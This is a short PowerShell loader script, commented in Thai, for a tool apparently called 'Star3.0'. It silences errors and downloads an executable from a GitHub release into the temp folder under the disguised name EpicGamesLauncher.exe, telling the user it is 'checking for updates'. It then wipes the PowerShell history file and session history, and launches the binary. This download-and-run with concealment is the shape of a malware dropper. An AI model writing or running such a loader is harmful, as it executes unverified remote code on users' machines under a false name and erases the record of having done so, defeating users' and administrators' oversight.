$ErrorActionPreference = "SilentlyContinue"

# ==========================================
# 🌟 บังคับใช้ TLS 1.2 สำหรับเชื่อมต่อ GitHub
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. ข้อมูลไฟล์และลิงก์
$downloadUrl = "https://github.com/GRILLYje/Animal_Star3.0_Public/releases/download/V1.0.1/EpicGamesLauncher.exe" 

# สร้างโฟลเดอร์แยกสำหรับ Star3.0
$folderPath = "$env:TEMP\Star3"
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

$tempPath = "$folderPath\EpicGamesLauncher.exe"

# 2. เช็คไฟล์เก่าและลบทิ้ง
if (Test-Path $tempPath) {
    Remove-Item $tempPath -Force
}

Write-Host "Checking for updates (Star3.0)" -ForegroundColor Cyan

# 3. ดาวน์โหลดไฟล์ (WebClient)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $tempPath)
    $webClient.Dispose()
} catch {
    Write-Host "An error occurred while downloading the file" -ForegroundColor Red
    Exit
}

# ==========================================
# 🌟 ส่วนที่เพิ่ม: ลบประวัติ PowerShell History
# ==========================================
try {
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Clear-Content -Path $historyPath
    }
    Clear-History
} catch {}
# ==========================================

# 4. รันโปรแกรม 
Write-Host "Launching Star3.0" -ForegroundColor Green
Start-Process -FilePath $tempPath
